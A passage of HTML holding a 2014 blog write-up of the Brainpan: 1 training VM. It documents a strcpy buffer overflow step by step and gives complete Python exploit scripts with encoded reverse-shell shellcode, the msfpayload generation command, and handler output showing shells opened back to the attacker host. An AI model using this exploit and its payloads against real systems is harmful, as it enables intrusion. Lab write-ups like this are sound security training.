@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Brainpan: 1 - Part 1 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2014-05-28">May 28, 2014</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/brainpan">brainpan</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">Brainpan: 1 - Part 1</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>Brainpan is a brilliant series of VMs created by <a href="https://twitter.com/superkojiman">superkojiman</a> - the goal is to gain root access.  These challenges are quite long and involved as they&rsquo;re not strictly at beginner level :), so I&rsquo;ve split the solution into multiple parts.</p>
+
+<h2 id="nmap:3c5805e5caac0bbd6084b7628143b7fb">Nmap</h2>
+
+<pre><code class="language-text">root@kali:~# nmap -n -sV -A -p- 192.168.127.128
+  
+PORT      STATE SERVICE VERSION
+9999/tcp  open  abyss?
+10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
+|_http-title: Hacking Trends
+1 service unrecognized despite returning data.
+</code></pre>
+
+<p>The service on port <code>9999</code> returns a mass of characters like HTML code, quite unreadable in the nmap output format, but with some evident words.  Pointing a web browser at it doesn&rsquo;t seem to return anything, but connecting via <code>netcat</code> does the trick.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/brainpan-1/brainpan.png"  />
+    
+    
+</figure>
+</div>
+
+<p>Every string I entered here returned an access denied message, and the <code>netcat</code> connection closed.</p>
+
+<p>I turned my attention back to the <code>SimpleHTTPServer</code> on port <code>10000</code>.</p>
+
+<h2 id="nikto:3c5805e5caac0bbd6084b7628143b7fb">Nikto</h2>
+
+<p>The index page on the web server didn&rsquo;t contain anything interesting, so I did some more enumeration.</p>
+
+<pre><code class="language-text">root@kali:~# nikto -h 192.168.127.128:10000 -Display 124
++ OSVDB-3092: /bin/: This might be interesting...
+</code></pre>
+
+<p>I popped over to this URL and found a directory listing, containing one file:  <code>brainpan.exe</code>.  I downloaded this to my Kali machine.</p>
+
+<pre><code class="language-text">root@kali:~/brainpan/1# file brainpan.exe 
+brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
+</code></pre>
+
+<p>This is a genuine Windows executable, so I ran in with <code>Wine</code> to see what I would do.</p>
+
+<pre><code class="language-text">root@kali:~/brainpan/1# wine brainpan.exe 
+[+] initializing winsock...done.
+[+] server socket created.
+[+] bind done on port 9999
+[+] waiting for connections.
+</code></pre>
+
+<p>So it&rsquo;s bound itself to port <code>9999</code> - I connected to it with <code>netcat</code> and received the same output as the application running on brainpan.</p>
+
+<h2 id="time-to-debug:3c5805e5caac0bbd6084b7628143b7fb">Time to Debug</h2>
+
+<p>If this application contains an exploitable vulnerability, then I may be able to leverage it to obtain a shell on brainpan.  I ran it through <code>strings</code>, to get an idea of the functions inside.</p>
+
+<pre><code class="language-text">root@kali:~/brainpan/1# strings brainpan.exe
+
+[...snip...]
+
+[get_reply] s = [%s]
+[get_reply] copied %d bytes to buffer
+shitstorm
+
+[...snip...]
+
+strcpy
+</code></pre>
+
+<p>Some interesting information here - first of all, it appears as though the valid password is stored inside the binary in plaintext.  I opened a new <code>netcat</code> connection and tried it.  I received an <em>ACCESS GRANTED</em> message, but it still exists back to the command prompt.</p>
+
+<p>Secondly, it seems as though the password input is passed to a buffer using the strcpy function.  This is notoriously vulnerable to buffer overflows, as it does nothing to validate the length of the input and blindly copies it into the buffer.  Hopefully, this would allow me to hijack the execution flow of the application and execute my own code to help gain access to the system.</p>
+
+<p>Initially I tried to debug it whilst it was running in Wine on my Kali VM, but it didn&rsquo;t work reliably.  I therefore moved it to a Windows XP VM, which I downloaded from Modern.IE.  My debugger of choice is <code>Immunity Debugger</code> paired with <code>mona.py</code> from the <code>Corelan Team</code>.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/brainpan-1/imdg.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>My Windows VM is running on the same internal subnet as brainpan and Kali, its IP address is 192.168.127.130.  I launched <code>brainpan.exe</code> in the debugger, and from my Kali VM, sent a long string of A&rsquo;s to the application.</p>
+
+<p><code>root@kali:~# python -c 'print &quot;A&quot; * 100' | nc 192.168.127.130 9999</code></p>
+
+<p>I started at 100 and worked my way up until the application crashed, which occured at <code>600 bytes</code>.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/brainpan-1/crash.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>We can see here that <code>EIP</code>, <code>EDX</code> and <code>ESP</code> have been overwritten with ASCII A&rsquo;s (41 Hex).  The next step is to calculate how many bytes are required to overwrite EIP.</p>
+
+<p><code>root@kali:~# ruby /usr/share/metasploit-framework/tools/pattern_create.rb 600 | nc 192.168.127.130 9999</code></p>
+
+<p>The application crashed again and the value of <code>EIP</code> read <code>35724134</code>.</p>
+
+<pre><code class="language-text">root@kali:~# ruby /usr/share/metasploit-framework/tools/pattern_offset.rb 35724134
+[*] Exact match at offset 524
+</code></pre>
+
+<p>This tells us that the number of bytes required before overwriting <code>EIP</code> is <code>524</code>.  I confirmed this by placing four B&rsquo;s into <code>EIP</code>, wedged between a group of A&rsquo;s and C&rsquo;s.</p>
+
+<p><code>root@kali:~# python -c 'print (&quot;A&quot; * 524) + (&quot;B&quot; * 4) + (&quot;C&quot; * 72)' | nc 192.168.127.130 9999</code></p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/brainpan-1/eip.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p><code>EIP</code> was overwritten with my B&rsquo;s as expected.  Some more analysis of the stack also shows that <code>ESP</code> starts directly underneath the address <code>EIP</code> was pointing at, as seen by the C&rsquo;s.  If I can find a <code>JMP ESP</code> instruction, I would be able to place by shellcode there.</p>
+
+<p>I&rsquo;ve been using <code>600</code> bytes so far and most of this is taken up to reach <code>EIP</code> and <code>ESP</code>, to place shellcode in <code>ESP</code> I will need to send more data.  I increased the buffer to <code>1000</code> bytes (by adding more C&rsquo;s) to see if the application still trashed in the same way, which it did.</p>
+
+<p>The next stage was to find a valid <code>JMP ESP</code> instruction within the binary, and obtain it&rsquo;s location in memory.</p>
+
+<p>This can be done in Kali using <code>objdump</code>, but I used the <code>mona</code> plugin for Immunity Debugger.  I find this more useful since it&rsquo;s capable of searching within Windows DLLs as well as the binary itself, and whether or not they&rsquo;re protected by ASLR, SafeSEH etc.  It&rsquo;s not applicable in this scenario but it&rsquo;s good to be able to use multiple tools :)</p>
+
+<p><code>!mona find -s '\xff\xe4' -m brainpan.exe</code></p>
+
+<p>So there is a single <code>JMP ESP</code> instruction in the brainpan binary.</p>
+
+<pre><code class="language-text">0x311712f3 : '\xff\xe4' |  {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\IEUser\My Documents\brainpan.exe)
+</code></pre>
+
+<p>Now I have a memory location for <code>JMP ESP</code> to put into <code>EIP</code>, I started writing my exploit, dubbed <code>skull_cracker</code>.</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+  
+import socket
+  
+target = '192.168.127.130'
+port = 9999
+  
+payload = &quot;A&quot; * 524
+payload += &quot;\xf3\x12\x17\x31&quot;
+payload += &quot;C&quot; * (1000 - 4 - 524)
+  
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  
+try:
+  
+        s.connect((target, port))
+        s.recv(1024)
+        s.send(payload)
+  
+except:
+  
+        print &quot;[x] Could not connect to &quot; + target + &quot; on &quot; + str(port) + &quot;.&quot;
+</code></pre>
+
+<p>I wanted to test this, to ensure the jump occured when <code>EIP</code> becomes overwritten.  This is quite easily achieved by placing a breakpoint in the debugger, which will automatically pause execution when a particular memory address is reached.</p>
+
+<p>I used the <code>Go to &gt; Expression</code> command in Immunity, to go to <code>0x311712f3</code> - as expected, the <code>JMP ESP</code> instruction was here.  I placed a breakpoint and ran my exploit.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/brainpan-1/break.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>The breakpoint was reached, which means the <code>JMP ESP</code> instruction had been reached.  I stepped the debugger forward by one instruction, with the expectation it would take me to the first group of C&rsquo;s.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/brainpan-1/step.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>Excellent, all going to plan so far.</p>
+
+<p>So really, the final stage is to add some shellcode to be executed.  I used <code>msfpayload</code> to generate some reverse Windows shellcode.  I didn&rsquo;t test for any bad characters, I just excluded null bytes and kept my fingers crossed.</p>
+
+<p><code>root@kali:~/brainpan/1# msfpayload windows/shell_reverse_tcp LHOST=192.168.127.127 R | msfencode -e x86/shikata_ga_nai -b '\x00' -t c</code></p>
+
+<p>I placed this into my exploit, along with a small <code>NOP</code> slide, so that it looked like this:</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+  
+import socket
+  
+target = '192.168.127.130'
+port = 9999
+  
+shellcode = (&quot;\xda\xd9\xd9\x74\x24\xf4\xbd\x28\x3b\xf5\xb9\x58\x31\xc9\xb1&quot; # 341 bytes
+&quot;\x4f\x31\x68\x19\x03\x68\x19\x83\xc0\x04\xca\xce\x09\x51\x83&quot;
+&quot;\x31\xf2\xa2\xf3\xb8\x17\x93\x21\xde\x5c\x86\xf5\x94\x31\x2b&quot;
+&quot;\x7e\xf8\xa1\xb8\xf2\xd5\xc6\x09\xb8\x03\xe8\x8a\x0d\x8c\xa6&quot;
+&quot;\x49\x0c\x70\xb5\x9d\xee\x49\x76\xd0\xef\x8e\x6b\x1b\xbd\x47&quot;
+&quot;\xe7\x8e\x51\xe3\xb5\x12\x50\x23\xb2\x2b\x2a\x46\x05\xdf\x80&quot;
+&quot;\x49\x56\x70\x9f\x02\x4e\xfa\xc7\xb2\x6f\x2f\x14\x8e\x26\x44&quot;
+&quot;\xee\x64\xb9\x8c\x3f\x84\x8b\xf0\x93\xbb\x23\xfd\xea\xfc\x84&quot;
+&quot;\x1e\x99\xf6\xf6\xa3\x99\xcc\x85\x7f\x2c\xd1\x2e\x0b\x96\x31&quot;
+&quot;\xce\xd8\x40\xb1\xdc\x95\x07\x9d\xc0\x28\xc4\x95\xfd\xa1\xeb&quot;
+&quot;\x79\x74\xf1\xcf\x5d\xdc\xa1\x6e\xc7\xb8\x04\x8f\x17\x64\xf8&quot;
+&quot;\x35\x53\x87\xed\x4f\x3e\xc0\xc2\x7d\xc1\x10\x4d\xf6\xb2\x22&quot;
+&quot;\xd2\xac\x5c\x0f\x9b\x6a\x9a\x70\xb6\xca\x34\x8f\x39\x2a\x1c&quot;
+&quot;\x54\x6d\x7a\x36\x7d\x0e\x11\xc6\x82\xdb\xb5\x96\x2c\xb4\x75&quot;
+&quot;\x47\x8d\x64\x1d\x8d\x02\x5a\x3d\xae\xc8\xed\x7a\x39\x33\x45&quot;
+&quot;\xfb\xc5\xdb\x94\x03\x2b\x40\x10\xe5\x21\x68\x74\xbe\xdd\x11&quot;
+&quot;\xdd\x34\x7f\xdd\xcb\xdc\x1c\x4c\x90\x1c\x6a\x6d\x0f\x4b\x3b&quot;
+&quot;\x43\x46\x19\xd1\xfa\xf0\x3f\x28\x9a\x3b\xfb\xf7\x5f\xc5\x02&quot;
+&quot;\x75\xdb\xe1\x14\x43\xe4\xad\x40\x1b\xb3\x7b\x3e\xdd\x6d\xca&quot;
+&quot;\xe8\xb7\xc2\x84\x7c\x41\x29\x17\xfa\x4e\x64\xe1\xe2\xff\xd1&quot;
+&quot;\xb4\x1d\xcf\xb5\x30\x66\x2d\x26\xbe\xbd\xf5\x56\xf5\x9f\x5c&quot;
+&quot;\xff\x50\x4a\xdd\x62\x63\xa1\x22\x9b\xe0\x43\xdb\x58\xf8\x26&quot;
+&quot;\xde\x25\xbe\xdb\x92\x36\x2b\xdb\x01\x36\x7e&quot;)
+  
+payload = &quot;A&quot; * 524
+payload += &quot;\xF3\x12\x17\x31&quot;
+payload += &quot;\x90&quot; * 20
+payload += shellcode
+payload += &quot;C&quot; * (1000 - 341 - 20 - 4 - 524)
+  
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  
+try:
+  
+        s.connect((target, port))
+        s.recv(1024)
+        s.send(payload)
+  
+except:
+  
+        print &quot;[x] Could not connect to &quot; + target + &quot; on &quot; + str(port) + &quot;.&quot;
+</code></pre>
+
+<p>I started up a multi/hander and launched my exploit.</p>
+
+<pre><code class="language-text">root@kali:~/brainpan/1# msfcli multi/handler payload=windows/shell_reverse_tcp lhost=192.168.127.127 E
+  
+[*] Started reverse handler on 192.168.127.127:4444
+[*] Starting the payload handler...
+[*] Command shell session 1 opened (192.168.127.127:4444 -&gt; 192.168.127.130:1288) at 2014-05-26 19:10:05 +0100
+  
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+  
+C:\Documents and Settings\IEUser\My Documents&gt;
+</code></pre>
+
+<p>Excellent.  Now I have a working exploit, all I need to do is swap the Windows shellcode out for Linux shellcode (also generated with <code>msfpayload</code>), and adjust the padding to account for the smaller shellcode.  My final payload was:</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+  
+import socket
+  
+target = '192.168.127.128'
+port = 9999
+  
+shellcode = (&quot;\xbe\x05\x65\x51\x54\xdd\xc3\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1&quot; # 95 bytes
+&quot;\x12\x31\x75\x12\x03\x75\x12\x83\xe8\x99\xb3\xa1\xc3\xba\xc3&quot;
+&quot;\xa9\x70\x7e\x7f\x44\x74\x09\x9e\x28\x1e\xc4\xe1\xda\x87\x66&quot;
+&quot;\xde\x11\xb7\xce\x58\x53\xdf\x10\x32\xdc\x60\xf9\x41\x23\x8f&quot;
+&quot;\xa5\xcc\xc2\x1f\x33\x9f\x55\x0c\x0f\x1c\xdf\x53\xa2\xa3\x8d&quot;
+&quot;\xfb\x12\x8b\x42\x93\x04\xfc\xc6\x0a\xbb\x8b\xe4\x9e\x10\x05&quot;
+&quot;\x0b\xae\x9c\xd8\x4c&quot;)
+  
+payload = &quot;A&quot; * 524
+payload += &quot;\xF3\x12\x17\x31&quot;
+payload += &quot;\x90&quot; * 20
+payload += shellcode
+payload += &quot;C&quot; * (1000 - 95 - 20 - 4 - 524)
+  
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  
+try:
+  
+        s.connect((target, port))
+        s.recv(1024)
+        s.send(payload)
+  
+except:
+  
+        print &quot;[x] Could not connect to &quot; + target + &quot; on &quot; + str(port) + &quot;.&quot;
+</code></pre>
+
+<pre><code class="language-text">root@kali:~/brainpan/1# msfcli multi/handler payload=linux/x86/shell_reverse_tcp lhost=192.168.127.127 E
+  
+[*] Command shell session 1 opened (192.168.127.127:4444 -&gt; 192.168.127.128:36381) at 2014-05-26 19:16:13 +0100
+  
+id
+uid=1002(puck) gid=1002(puck) groups=1002(puck)
+  
+pwd
+/home/puck
+</code></pre>
+
+<p>Now I finally have a shell on brainpan - it&rsquo;s time to end Part 1&hellip;</p>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2014  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
